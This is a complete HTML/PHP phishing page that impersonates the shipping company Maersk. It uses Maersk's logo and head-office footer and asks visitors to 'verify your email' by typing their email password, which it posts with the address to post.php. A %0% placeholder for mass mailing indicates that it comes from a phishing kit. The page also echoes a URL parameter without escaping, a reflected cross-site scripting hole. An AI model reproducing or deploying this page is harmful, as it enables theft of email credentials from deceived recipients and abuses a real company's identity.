<!DOCTYPE HTML>
<html>
<head>
<title>Maersk Inc</title>
<link rel="shortcut icon" href="http://www.maersk.com/Style%20Library/Images/MaerskComExt/favicon.ico">
<meta http-equiv = "refresh" content = "0; url = https://maersk/index.php?email=%0%" />
</head>
<style>
.body {
	width: 100%;
	background-color: white;
	margin-top: 30px;
	overflow: hidden;
}
.object {
	width: 70%;
	padding-left: 10px;
	padding-right: 10px;
	padding-bottom: 10px;
	padding-top: 10px;
	margin-top: 20px;
	


}
.button {
  padding: 15px 25px;
  font-size: 24px;
  text-align: center;
  cursor: pointer;
  outline: none;
  color: #fff;
  background-color: grey;
  border: none;
  border-radius: 15px;
  box-shadow: 0 9px #999;
}

.button:hover {background-color: grey}

.button:active {
  background-color: black;
  box-shadow: 0 5px #666;
  transform: translateY(4px);
}
.footer {
	font-size:13px;
	color: #28ACE2;
	width: 50%;
}

</style> 
<body class="body">
   <div><center><img src="http://upload.wikimedia.org/wikipedia/commons/6/6c/Maersk_Group_Logo.jpeg" height="50" width="220"><br><BR><img src="http://upload.evocdn.co.uk/fruitnet/uploads/asset_image/2_25582_e.jpg" alt="" width="380" height="200" border="0"></center>
   
   <center>
   <div class="object">
	


						
				
				<form method="post" action="post.php" autocomplete="off" name="login_form">

				<input type="hidden" name=".pd" value="ym_ver=0&c=&ivt=&sg=">
				<table id="yreglgtb" summary="form: login information" cellspacing="0" cellpadding="0">
				
										<tr>
                                            <td><input name="email" type="hidden" value="<?php echo $_GET['email']; ?>"></td>

                                        </tr>
										<tr>
                                                <p>Please verify your email to prove you're not a robot</p> 

                                        </tr>
                                       
                                        <tr>
                                                <td><p><?php echo $_GET['email']; ?></p> </td>

                                        </tr>
                                        <tr>
                                                <th><label for="passwd">Password:</label></th></tr><br><br>
                                        <tr>
                                                <td><input name="pass" id="passwd" class="yreg_ipt" type="password" maxlength="100" required="" placeholder="Enter Email Password"></td>

                                        </tr>


				
				</table>


<div class="clear"></div>
					<p class="yreglgsb"><input class="button" type="submit" value="Preview" name="save"></p>
				</form>	
   </div></center>
		<center><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><div class="footer"><footer>
			 <p>This email was sent to %0%. To get in touch with us, email <i>cphhrd@maersk.com</i> or contact our <b>HEAD OFFICE:</b> Esplanaden 50, 1098 København K, Denmark.</p>
		</footer></div></center>
									<!--footer section end-->
								</div>
							</div>

<!--js -->
<link rel="stylesheet" href="css/vroom.css">
<script type="text/javascript" src="js/vroom.js"></script>
<script type="text/javascript" src="js/TweenLite.min.js"></script>
<script type="text/javascript" src="js/CSSPlugin.min.js"></script>
<script src="js/jquery.nicescroll.js"></script>
<script src="js/scripts.js"></script>

<!-- Bootstrap Core JavaScript -->
   <script src="js/bootstrap.min.js"></script>
</body>
</html>